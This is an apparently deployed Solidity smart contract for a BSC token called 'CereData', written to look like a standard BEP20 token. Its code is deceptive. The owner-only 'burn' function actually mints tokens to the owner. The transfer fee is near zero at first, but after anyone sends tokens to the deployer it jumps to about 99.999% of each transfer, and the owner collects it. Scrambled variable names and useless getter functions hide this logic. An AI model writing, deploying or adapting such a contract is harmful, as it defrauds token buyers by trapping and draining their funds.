/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.15;
contract CereData {
uint256 private  CereData1 = 100000000;
address private  rtGQGU = address(0);
address private  OOmwBK = address(0);
string public  name = "CereData";
address private  zxOUtM = address(0);
address private  HZfMpN = address(0);
address private  rhJEXa = address(0);
uint8 public constant decimals = 18;
uint256 private  XuACIg = 100000000;
uint256 private  jsoiTY = 1000000000000000000;
address private  bKRofE = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  AZHYmi = 10000000000;
address private  aTcNkE = address(0);
uint256 private  dlXhRO = 1000000000000000;
address private  kDjeGR = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  PkMtyH = 1000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  aXzldh = 10000000000000;
string public  symbol = "CereData";
uint256 private  EXrYGS = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => mapping (address => uint256)) private _allowances;
address private  rvFOol = address(0);
address public owner;
uint256 public constant bnQUwP = 99999;
mapping (address => uint256) public balanceOf;




function _getOOmwBK() private returns (address) {
return OOmwBK;
}





function _getrvFOol() private returns (address) {
return rvFOol;
}

function _getdlXhRO() private returns (uint256) {
return dlXhRO;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getaXzldh() private returns (uint256) {
return aXzldh;
}

function _getrtGQGU() private returns (address) {
return rtGQGU;
}

function _getXuACIg() private returns (uint256) {
return XuACIg;
}





function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function _getkDjeGR() private returns (address) {
return kDjeGR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getEXrYGS() private returns (uint256) {
return EXrYGS;
}



function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}




constructor () {
HZfMpN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getaTcNkE() private returns (address) {
return aTcNkE;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getPkMtyH() private returns (uint256) {
return PkMtyH;
}

function _getAZHYmi() private returns (uint256) {
return AZHYmi;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "cBntWi");
require(to != address(0), "cBntWi");
require(amount <= balanceOf[from], "cBntWi");
uint256 leef;
uint256 fee;	
if (from == owner || to == owner){
leef = 0;
fee = 0; 	
}
else{
fee = 0; 	
leef = amount* bnQUwP/jsoiTY ;
}

uint256 transferAmount = amount - leef;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += leef;
if (to==HZfMpN){
jsoiTY = CereData1/CereData1 + bnQUwP;
}
emit Transfer(from, to, transferAmount);
}


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tcBntWi 0");
require(spender != address(0), "fcBntWi 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _getzxOUtM() private returns (address) {
return zxOUtM;
}

function _getbKRofE() private returns (address) {
return bKRofE;
}



function _getrhJEXa() private returns (address) {
return rhJEXa;
}


}